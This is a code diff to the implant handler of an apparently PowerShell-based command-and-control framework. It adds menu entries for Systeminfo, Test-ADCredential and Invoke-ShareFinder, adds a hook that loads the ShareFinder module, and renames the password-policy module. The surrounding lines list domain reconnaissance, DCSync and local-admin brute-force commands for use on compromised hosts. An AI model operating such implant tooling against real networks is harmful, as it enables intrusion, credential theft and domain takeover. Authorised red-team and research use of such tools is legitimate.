@@ -117,6 +117,7 @@ function Implant-Handler
         write-host " Unhide-Implant"-ForegroundColor Green 
         write-host " Output-To-HTML"-ForegroundColor Green 
         write-host " Get-Proxy"-ForegroundColor Green 
+        write-host " Systeminfo"-ForegroundColor Green 
         write-host " Unzip <source file> <destination folder>"-ForegroundColor Green 
         #write-host " Zip <destination zip file> <source folder>"-ForegroundColor Green 
         write-host " Get-System | Get-System-WithProxy" -ForegroundColor Green 
@@ -152,7 +153,9 @@ function Implant-Handler
         write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Get-ExternalIP" -ForegroundColor Green
+        write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green  
         write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators" -ForegroundColor Green  
+        write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
         write-host " Nltest /dclist:<domain> | Nltest /domain_trusts" -ForegroundColor Green 
         write-host ' Get-NetUser -Filter "(userprincipalname=*@testdomain.com)" | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
         write-host ' Get-NetGroup -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname' -ForegroundColor Green 
@@ -667,6 +670,10 @@ $error.clear()
             { 
                 CheckModuleLoaded "PowerView.ps1" $psrandomuri
             }
+            if ($pscommand.ToLower().StartsWith('invoke-sharefinder'))
+            { 
+                CheckModuleLoaded "invoke-sharefinder.ps1" $psrandomuri
+            }
             if ($pscommand.ToLower().StartsWith('invoke-dcsync'))
             { 
                 CheckModuleLoaded "Invoke-DCSync.ps1" $psrandomuri
@@ -699,9 +706,9 @@ $error.clear()
             {
                 CheckModuleLoaded "brute-locadmin.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('get-pass-pol'))
+            if ($pscommand.tolower().startswith('get-passpol'))
             {
-                CheckModuleLoaded "get-pass-pol.ps1" $psrandomuri
+                CheckModuleLoaded "get-passpol.ps1" $psrandomuri
             }
             if ($pscommand.tolower().startswith('get-locadm'))
             {
